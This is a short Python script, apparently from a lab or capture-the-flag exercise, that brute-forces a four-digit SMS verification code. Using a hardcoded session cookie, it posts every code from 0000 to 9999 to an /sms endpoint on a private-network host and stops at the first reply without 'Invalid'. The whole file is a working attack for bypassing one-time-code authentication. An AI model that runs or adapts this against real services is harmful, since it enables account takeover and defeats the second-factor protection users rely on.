import requests

url = "http://10.49.151.64:8080/sms"
cookies = {
    "session": "eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aoMxbw.DcQihGUkFlug4m7JGVNk_mZ_DUk"
}

for i in range(10000):
    code = f"{i:04d}"
    r = requests.post(url, data={"sms": code}, cookies=cookies)

    if "Invalid" not in r.text:
        print(f"[+] Possible code: {code}")
        break
